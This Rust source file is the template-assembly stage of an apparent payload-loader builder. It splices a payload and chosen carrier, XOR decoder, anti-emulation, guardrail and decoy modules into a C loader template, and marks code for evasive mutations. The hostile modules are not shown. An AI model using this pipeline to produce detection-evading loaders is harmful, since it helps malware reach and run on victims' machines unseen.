//! Template Assembler
//!
//! Assembles modular C templates by replacing @MODULE markers with selected module code.
//! This is the first phase of the build pipeline:
//!   1. Assembler replaces @MODULE markers → single .c file
//!   2. AST Mutator transforms @MUTATE markers
//!   3. Compiler produces final artifact

use anyhow::{Context, Result, bail};
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use tracing::{debug, info};

/// Module selection for artifact assembly
#[derive(Debug, Clone, Default)]
pub struct ModuleSelection {
    /// Carrier module: "alloc_rw_rx", "change_rw_rx", "peb_walk"
    pub carrier: String,
    /// Decoder module: "xor", "english"
    pub decoder: String,
    /// Anti-emulation module: "none", "sirallocalot", "timeraw"
    pub antiemulation: String,
    /// Guardrail module: "none", "env"
    pub guardrail: String,
    /// VirtualProtect module: "standard", "undersized"
    pub virtualprotect: String,
    /// Decoy module: "none", "winexec"
    pub decoy: String,
}

impl ModuleSelection {
    /// Create a new module selection with defaults
    pub fn new() -> Self {
        Self {
            carrier: "alloc_rw_rx".to_string(),
            decoder: "xor".to_string(),
            antiemulation: "none".to_string(),
            guardrail: "none".to_string(),
            virtualprotect: "standard".to_string(),
            decoy: "none".to_string(),
        }
    }

    /// Validate that all selected modules exist
    pub fn validate(&self, template_dir: &Path) -> Result<()> {
        let modules_dir = template_dir.join("modules");

        let checks = [
            (
                "carrier",
                &self.carrier,
                modules_dir
                    .join("carrier")
                    .join(format!("{}.c", self.carrier)),
            ),
            (
                "decoder",
                &self.decoder,
                modules_dir
                    .join("decoder")
                    .join(format!("{}.c", self.decoder)),
            ),
            (
                "antiemulation",
                &self.antiemulation,
                modules_dir
                    .join("antiemulation")
                    .join(format!("{}.c", self.antiemulation)),
            ),
            (
                "guardrail",
                &self.guardrail,
                modules_dir
                    .join("guardrails")
                    .join(format!("{}.c", self.guardrail)),
            ),
            (
                "virtualprotect",
                &self.virtualprotect,
                modules_dir
                    .join("virtualprotect")
                    .join(format!("{}.c", self.virtualprotect)),
            ),
            (
                "decoy",
                &self.decoy,
                modules_dir.join("decoy").join(format!("{}.c", self.decoy)),
            ),
        ];

        for (category, name, path) in checks {
            if !path.exists() {
                bail!("Module not found: {} '{}' at {:?}", category, name, path);
            }
        }

        Ok(())
    }
}

/// Template assembler that combines modules into a single source file
pub struct Assembler {
    /// Path to template directory
    template_dir: PathBuf,
    /// Cache of loaded module contents
    module_cache: HashMap<String, String>,
}

impl Assembler {
    /// Create a new assembler with the given template directory
    pub fn new(template_dir: impl AsRef<Path>) -> Result<Self> {
        let template_dir = template_dir.as_ref().to_path_buf();

        if !template_dir.exists() {
            bail!("Template directory does not exist: {:?}", template_dir);
        }

        Ok(Self {
            template_dir,
            module_cache: HashMap::new(),
        })
    }

    /// Assemble a complete source file from the template and selected modules
    pub fn assemble(&mut self, modules: &ModuleSelection, payload_code: &str) -> Result<String> {
        // Validate module selection
        modules.validate(&self.template_dir)?;

        // Read the main template
        let template_path = self.template_dir.join("loader_template.c");
        let template = std::fs::read_to_string(&template_path)
            .with_context(|| format!("Failed to read template: {:?}", template_path))?;

        info!(
            carrier = %modules.carrier,
            decoder = %modules.decoder,
            antiemulation = %modules.antiemulation,
            guardrail = %modules.guardrail,
            virtualprotect = %modules.virtualprotect,
            decoy = %modules.decoy,
            "Assembling artifact with modules"
        );

        // Replace @MODULE markers with module content
        let output = template
            .replace("// @MODULE:payload", payload_code)
            .replace(
                "// @MODULE:definitions",
                &self.read_module("header/definitions.h")?,
            )
            .replace(
                "// @MODULE:decoder",
                &self.read_module(&format!("decoder/{}.c", modules.decoder))?,
            )
            .replace(
                "// @MODULE:virtualprotect",
                &self.read_module(&format!("virtualprotect/{}.c", modules.virtualprotect))?,
            )
            .replace(
                "// @MODULE:antiemulation",
                &self.read_module(&format!("antiemulation/{}.c", modules.antiemulation))?,
            )
            .replace(
                "// @MODULE:guardrail",
                &self.read_module(&format!("guardrails/{}.c", modules.guardrail))?,
            )
            .replace(
                "// @MODULE:decoy",
                &self.read_module(&format!("decoy/{}.c", modules.decoy))?,
            )
            .replace(
                "// @MODULE:carrier",
                &self.read_module(&format!("carrier/{}.c", modules.carrier))?,
            );

        debug!(output_len = output.len(), "Assembly complete");

        Ok(output)
    }

    /// Read a module file, stripping the definitions.h include (already included in template)
    fn read_module(&mut self, relative_path: &str) -> Result<String> {
        // Check cache first
        if let Some(cached) = self.module_cache.get(relative_path) {
            return Ok(cached.clone());
        }

        let full_path = self.template_dir.join("modules").join(relative_path);
        let content = std::fs::read_to_string(&full_path)
            .with_context(|| format!("Failed to read module: {:?}", full_path))?;

        // Strip the definitions.h include since it's already in the main template
        // Also strip any #include <stdio.h> as it's added at the top
        let cleaned: String = content
            .lines()
            .filter(|line| {
                let trimmed = line.trim();
                !trimmed.contains("definitions.h") && !trimmed.starts_with("#include <stdio.h>")
            })
            .collect::<Vec<_>>()
            .join("\n");

        // Cache for future use
        self.module_cache
            .insert(relative_path.to_string(), cleaned.clone());

        Ok(cleaned)
    }

    /// Get list of available modules for a category
    pub fn list_modules(&self, category: &str) -> Result<Vec<String>> {
        let dir_name = match category {
            "guardrail" => "guardrails",
            other => other,
        };

        let modules_dir = self.template_dir.join("modules").join(dir_name);

        if !modules_dir.exists() {
            bail!("Module category not found: {}", category);
        }

        let mut modules = Vec::new();
        for entry in std::fs::read_dir(&modules_dir)? {
            let entry = entry?;
            let path = entry.path();
            if path.extension().map_or(false, |ext| ext == "c") {
                if let Some(stem) = path.file_stem() {
                    modules.push(stem.to_string_lossy().to_string());
                }
            }
        }

        modules.sort();
        Ok(modules)
    }

    /// Clear the module cache
    pub fn clear_cache(&mut self) {
        self.module_cache.clear();
    }
}

/// Extract @MUTATE markers from source code
pub fn extract_mutation_markers(source: &str) -> Vec<MutationMarker> {
    let mut markers = Vec::new();

    for (line_num, line) in source.lines().enumerate() {
        if let Some(idx) = line.find("// @MUTATE:") {
            let marker_text = &line[idx + 11..]; // Skip "// @MUTATE:"
            let marker_text = marker_text.trim();

            // Parse marker name and optional parameters
            let (name, params) = if let Some(paren_idx) = marker_text.find('(') {
                let name = &marker_text[..paren_idx];
                let params: Vec<String> = marker_text
                    .get(paren_idx + 1..marker_text.len().saturating_sub(1))
                    .unwrap_or("")
                    .split('|')
                    .map(|s| s.trim().to_string())
                    .collect();
                (name.to_string(), params)
            } else {
                (marker_text.to_string(), Vec::new())
            };

            markers.push(MutationMarker {
                name,
                params,
                line: line_num + 1, // 1-indexed
                column: idx,
            });
        }
    }

    markers
}

/// A mutation marker found in source code
#[derive(Debug, Clone)]
pub struct MutationMarker {
    /// Marker name (e.g., "timing_jitter", "api_wrapper_injection")
    pub name: String,
    /// Optional parameters (e.g., ["direct", "callback", "fiber", "threadpool"])
    pub params: Vec<String>,
    /// Line number (1-indexed)
    pub line: usize,
    /// Column position
    pub column: usize,
}

/// Strip all @MUTATE markers from source code (for final compilation)
pub fn strip_mutation_markers(source: &str) -> String {
    source
        .lines()
        .filter(|line| !line.contains("// @MUTATE:"))
        .collect::<Vec<_>>()
        .join("\n")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_selection_defaults() {
        let selection = ModuleSelection::new();
        assert_eq!(selection.carrier, "alloc_rw_rx");
        assert_eq!(selection.decoder, "xor");
        assert_eq!(selection.antiemulation, "none");
        assert_eq!(selection.guardrail, "none");
        assert_eq!(selection.virtualprotect, "standard");
        assert_eq!(selection.decoy, "none");
    }

    #[test]
    fn test_extract_mutation_markers() {
        let source = r#"
int main() {
    // @MUTATE:timing_jitter
    // @MUTATE:execution_method(direct|callback|fiber|threadpool)
    do_something();
}
"#;
        let markers = extract_mutation_markers(source);
        assert_eq!(markers.len(), 2);
        assert_eq!(markers[0].name, "timing_jitter");
        assert!(markers[0].params.is_empty());
        assert_eq!(markers[1].name, "execution_method");
        assert_eq!(
            markers[1].params,
            vec!["direct", "callback", "fiber", "threadpool"]
        );
    }

    #[test]
    fn test_strip_mutation_markers() {
        let source = r#"int main() {
    // @MUTATE:timing_jitter
    do_something();
    // @MUTATE:opaque_predicate
    return 0;
}"#;
        let stripped = strip_mutation_markers(source);
        assert!(!stripped.contains("@MUTATE"));
        assert!(stripped.contains("do_something()"));
        assert!(stripped.contains("return 0;"));
    }
}
